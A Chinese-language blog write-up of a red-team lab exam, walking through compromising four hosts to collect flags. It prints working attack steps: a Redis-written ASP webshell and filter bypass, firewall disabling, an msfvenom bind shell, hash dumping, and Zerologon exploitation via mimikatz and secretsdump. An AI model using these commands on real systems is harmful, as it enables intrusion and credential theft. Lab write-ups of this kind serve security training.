        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1367358886&auto=1&height=66"></iframe><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/XcCJfM.jpg"><br>本次靶场要求：<br>提示： <a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br>四个 <code>root.txt</code> 分别在四台机子用户目录下 <code>拿到三个及格</code> <code>拿下四个满分</code></p><h2 id="代码审计-Getshell"><a href="#代码审计-Getshell" class="headerlink" title="代码审计 Getshell"></a>代码审计 Getshell</h2><p>首先是一个站：cocat.cc<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Q85dTv.jpg"><br>通过提示把它的备份文件下载到了本地进行审计：<a href="http://www.cocat.cc/web.zip">http://www.cocat.cc/web.zip</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/7ucmM0.jpg"></p><h2 id="Bypass-突破执行命令"><a href="#Bypass-突破执行命令" class="headerlink" title="Bypass 突破执行命令"></a>Bypass 突破执行命令</h2><p>通过审计拿到了一个 webshell：<a href="http://www.cocat.cc/kss_tool/_webup.php">http://www.cocat.cc/kss_tool/_webup.php</a><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AQWnLh.jpg"><br>由于当前环境不能执行命令，函数都写死了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/x4nSCi.jpg"><br>通过翻文件翻到了 <code>Mysql</code> 的配置文件：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dqgLUW.jpg"><br>本想尝试 <code>Mysql udf</code> 提权绕过发现 <code>Mysql</code> 版本大于 <code>5.1</code> ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3zeFtD.jpg"></p><h3 id="拿到宝塔后台权限"><a href="#拿到宝塔后台权限" class="headerlink" title="拿到宝塔后台权限"></a>拿到宝塔后台权限</h3><p>由于当前 <code>web</code> 是宝塔搭建的:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/wubTCy.jpg"><br>通过翻文件找到了宝塔后台地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/BtSoft/panel/data/admin_path.pl</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CdkKrH.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Y0sh7p.jpg"><br>然后通过把宝塔的 <code>default.db</code> 文件下载到本地打开，<code>users</code> 表里就是宝塔的登陆账号密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ktnP65.jpg"><br><code>md5</code> 是肯定解密不出来的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/CImb4L.jpg"><br>这个时候需要替换 <code>md5</code> 或者添加一个用户：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/74ktDN.jpg"><br>然后把文件保存，上传到目标宝塔目录下：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PcMi5c.jpg"><br>这个时候使用账号 <code>saulGoodmang</code> 密码 <code>123456</code> 去登陆：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/vAuUxu.jpg"><br>手动把禁用的函数关闭：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/dZH8bO.jpg"><br>然后给他来个重启：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/n41yfZ.jpg"><br>命令执行强行绕过：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/02f1Cm.jpg"></p><h3 id="拿到第一个-root-txt"><a href="#拿到第一个-root-txt" class="headerlink" title="拿到第一个 root.txt"></a>拿到第一个 root.txt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-c20ad4d76fe97759aa27a0c99bff6710-1&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/l4PGJh.jpg"></p><h2 id="内网渗透一"><a href="#内网渗透一" class="headerlink" title="内网渗透一"></a>内网渗透一</h2><p>通过查看进程发现有<code>火绒AV</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4UaLas.jpg"><br>随即做免杀上线到 <code>CS</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/xvj65T.jpg"><br>发现当前内网应该是有其他主机存活的：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/eZrnGH.jpg"><br>通过 <code>nbtscan</code> 发现内网还有一台主机存活：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/KWP6wi.jpg"><br>通过 <code>fscan</code> 也扫描出来内网资产了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/W3dyzX.jpg"><br>为了进内网直接做了一个 <code>frp socks</code> 代理进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/85FRm8.jpg"><br>通过 <code>lengyi</code> 老哥的脚本绕过火绒添加了一个用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/ELFKe3.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/8vtTjI.jpg"><br>然后开启了它的 <code>3389</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/woto8N.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Fg29dd.jpg"><br>为了方便我把 <code>shell</code> 弹到了<code>msf</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/djqpOn.jpg"><br>然后抓到了 <code>hash</code>：（由于是 windows 2012 明文是抓不了的，只能抓 hash）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:de935c6087ec367d3ef786915a4edcce:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">hacker:1003:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::</span><br><span class="line">mysql:1002:aad3b435b51404eeaad3b435b51404ee:291376866817cf2ccfe198308e5f925b:::</span><br><span class="line">www.saulgoodman.cn:1001:aad3b435b51404eeaad3b435b51404ee:894f353e870620b186a9a46ce56ac8f1:::</span><br></pre></td></tr></table></figure><p>通过解密得到了 <code>administrator</code> 的密码：<code>QWEasd444</code></p><h3 id="内网横向移动-192-168-59-4"><a href="#内网横向移动-192-168-59-4" class="headerlink" title="内网横向移动-192.168.59.4"></a>内网横向移动-192.168.59.4</h3><p>通过 <code>msf</code> 对内网进行扫描 <code>arp</code> 存活发现了几台机器：（之前没扫描出来应该是有防火墙）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/arp_scanner</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/QS9PWe.jpg"><br><code>192.168.59.1</code> 就不用看了是网关，<code>192.168.59.4</code> 就是内网另一台主机！<br>随后 <code>proxychains</code> + <code>nmap</code> 对 <code>192.168.59.4</code> 进行扫描探测端口服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -sV -Pn -n -p22,80,139,135,445,3306,1433,6379  192.168.59.4</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/FfkbkQ.jpg"><br>发现开放的端口有：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/1Y7Hgu.jpg"><br><code>web</code> 页面的话倒是没啥：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/smDzai.jpg"><br>看了看扫描出来 <code>6379</code> 应该是 <code>redis</code> 相关漏洞！<br>通过尝试 <code>redis</code> 未授权发现连接成功！<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/jWj5Df.jpg"><br>但是查看信息发现出错，应该是密码问题：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4ORUe5.jpg"><br>通过 <code>msf redis</code> 爆破模块爆破出了密码：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3UPmy7.jpg"><br>重新登陆 <code>redis</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains redis-cli -h 192.168.59.4 -p 6379 -a 123456789qq</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MC9rF5.jpg"><br>登陆成功！现在要想拿到权限首先我们不知道网站路径（写不了一句话 ），但是知道当前网站使用的是 <code>IIS</code>，那么 <code>IIS</code> 默认目录是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Inetpub\wwwroot</span><br></pre></td></tr></table></figure><p>设想会不会是这个目录呢？随即写了一个 <code>aspx</code> 的 <code>shell</code> 到 <code>IIS</code> 默认目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.4:6379&gt; config set dir C:/inetpub/wwwroot/</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; config set dbfilename 1.aspx</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; set x &#x27;&lt;%execute(request(&quot;x&quot;))%&gt;&#x27;  //注意这里要用单引号</span><br><span class="line">OK</span><br><span class="line">192.168.59.4:6379&gt; save</span><br></pre></td></tr></table></figure><p>发现写入不了，随后设置了读写权限 ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> slave-read-only on </span><br></pre></td></tr></table></figure><p>然后发现读写可以了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/TUmZnl.jpg"><br>再来写一遍 <code>webshell</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/54B8fs.jpg"><br>发现是 <code>404</code>，写 <code>asp</code> 是 <code>500</code>，应该是什么东西拦截了。</p><p>随后 <code>bypass</code> 测试，可以通过这样绕过：（单引号中间要带空格）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x &#x27;    &lt;%execute(request(&quot;x&quot;))%&gt;    &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/UnHe9h.jpg"><br>拿到 webshell：<a href="http://192.168.59.4/a.asp">http://192.168.59.4/a.asp</a> </p><h2 id="内网渗透二"><a href="#内网渗透二" class="headerlink" title="内网渗透二"></a>内网渗透二</h2><p>通过发现当前机器是不出网的，而且权限还很小：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/gVDNVZ.jpg"><br>发现当前机器上权限太小任何文件都上传不了：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/fDTOcr.jpg"><br>通过找到了一个可读可写目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\VMware\logs\</span><br></pre></td></tr></table></figure><p>并且当前机器上无任何杀软：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/lq7GNB.jpg"><br>随即坏土豆提权成功：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/kMKMZg.jpg"><br>拿到第二个 flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;moonsec-b6d767d2f8ed5d21a44b0e5886680cb9-2&#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/HKW3g8.jpg"><br>随即添加了一个 <code>asp.net</code> 管理员用户进去：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/59R6UE.jpg"></p><h3 id="内网渗透-10-10-10-202"><a href="#内网渗透-10-10-10-202" class="headerlink" title="内网渗透-10.10.10.202"></a>内网渗透-10.10.10.202</h3><p>通过对内网进行存活探测发现内网存活了三台：<code>10.10.10.201</code>、<code>10.10.10.202</code>（本机）、<code>10.10.10.209</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l  %i  <span class="keyword">in</span> (1,1,255) <span class="keyword">do</span> @  ping  10.10.10.%i  -w  1  -n  1 |  find  /i  <span class="string">&quot;ttl=&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/iwqJRB.jpg"><br>随后关闭它防火墙：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/Sy0gCC.jpg"><br>然后 <code>MSF</code> 生成<code>正向 shell</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=9099 -f exe &gt;/root/9099.exe</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/t5IHA0.jpg"><br>目标运行 <code>9090.exe</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/42BMGT.jpg"><br>随后 <code>MSF</code> 上线：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/idgoPV.jpg"><br><code>hashdump</code> 解密得到了密码：<code>QWEasd1122</code>:<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/MxlBT8.jpg"><br>紧接着开了它的远程桌面：（之前添加了一个 <code>asp.net</code> 用户，方便后续好登陆桌面 ）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PalAyt.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/NtwfJz.jpg"><br>通过 <code>nbtcan</code> 发现 <code>10.10.10.201</code>（DC）、<code>10.10.10.209</code> 是域环境：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2C0KDV.jpg"><br>得想办法拿到一台域机器<br>对他们进行扫描端口发现他们都开放了 <code>web</code> 服务：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/K117Za.jpg"><br>其中 <code>10.10.10.209</code> 还是一个 <code>Outlook Web App</code>（微软的邮件组件）<code>Exchange</code>  ：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/9pVZbV.jpg"><br>但是我们没有账号，这个时候我在 <code>Redis</code> 上找到了 <code>pts</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users&gt;<span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.pst) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Documents and Settings\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \moonsec@cncat.cc.pst</span><br><span class="line">c:\Users\Administrator\My Documents\Outlook \<span class="built_in">test</span>@cncat.cc - test.pst</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/PvVtxj.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/brmbb0.jpg"><br>知道了两个用户邮箱：<code>moonsec@cncat.cc</code>、<code>test@cncat.cc</code><br>然后把文件都下载到本地，进行后续利用（发现都失败了）</p><h3 id="CVE-2020-1472-拿到域控"><a href="#CVE-2020-1472-拿到域控" class="headerlink" title="CVE-2020-1472 拿到域控"></a>CVE-2020-1472 拿到域控</h3><p>之后发现他域控存在 <code>CVE-2020-1472</code> 域内提权漏洞：（需要 20200918 之后的 mimikatz 才可以使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12SERVER-DC$</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/L1HPti.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:10.10.10.201 /account:12server-dc$ /exploit</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/bc1VGK.jpg"><br>导出所有域内用户凭证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py cncat/12server-dc$@<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span> -no-<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">cncat.cc\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br></pre></td></tr></table></figure><p><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/oJeHh4.jpg"><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/IbR021.jpg"><br>拿到域控和 <code>flag</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/2KQulH.jpg"><br>利用 <code>msf psexec</code> 上线：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting                                                    Required  Description</span><br><span class="line">   ----                  ---------------                                                    --------  -----------</span><br><span class="line">   RHOSTS                10.10.10.201                                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT                 445                                                                yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                                                                      no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                                                                     no        The service display name</span><br><span class="line">   SERVICE_NAME                                                                             no        The service name</span><br><span class="line">   SHARE                                                                                    no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain             cncat                                                              no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387  no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser               Administrator                                                      no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/bind_tcp_rc4):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   EXITFUNC     thread           yes       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LPORT        4446             yes       The listen port</span><br><span class="line">   RC4PASSWORD  msf              yes       Password to derive RC4 key from</span><br><span class="line">   RHOST        10.10.10.201     no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.201:445 - Connecting to the server...</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] 10.10.10.201:445 - Authenticating to 10.10.10.201:445|cncat as user <span class="string">&#x27;Administrator&#x27;</span>...</span><br><span class="line">[*] 10.10.10.201:445 - Selecting PowerShell target</span><br><span class="line">[*] 10.10.10.201:445 - Executing the payload...</span><br><span class="line">[+] 10.10.10.201:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.201:4446</span><br><span class="line">NOTE: Rex::Socket.gethostbyname is deprecated, use getaddress, resolve_nbo, or similar instead. It will be removed <span class="keyword">in</span> the next Major version</span><br><span class="line">[*] Sending stage (200266 bytes) to 10.10.10.201</span><br><span class="line">[*] Meterpreter session 5 opened (0.0.0.0:0 -&gt; 180.215.199.206:22222) at 2021-06-02 06:35:22 +0000</span><br><span class="line"></span><br><span class="line">meterpreter &gt;                                                                                    </span><br></pre></td></tr></table></figure><p>然后通过令牌窃取身份切换为域管：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/3jm7e1.jpg"><br>然后通过和域机器 <code>10.10.10.209</code> 建立 <code>IPC</code>：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/AUKzNo.jpg"><br>至此最后一个 <code>flag</code> 也拿到：<br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/uPic/4p4HUP.jpg"><br>至此本次考核完毕！</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>对于红队成员来说最重要的就是渗透不能有短板，各种漏洞都应该去复现一遍，由于我 <code>Exchange</code> 的漏洞未复现导致卡了很长时间，最后还是使用暴力的手段拿到域控，在真实环境中很危险，很有可能导致域控的密码恢复不了！哦豁，那你就等着跑路吧！</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> redTeam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redTeam </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
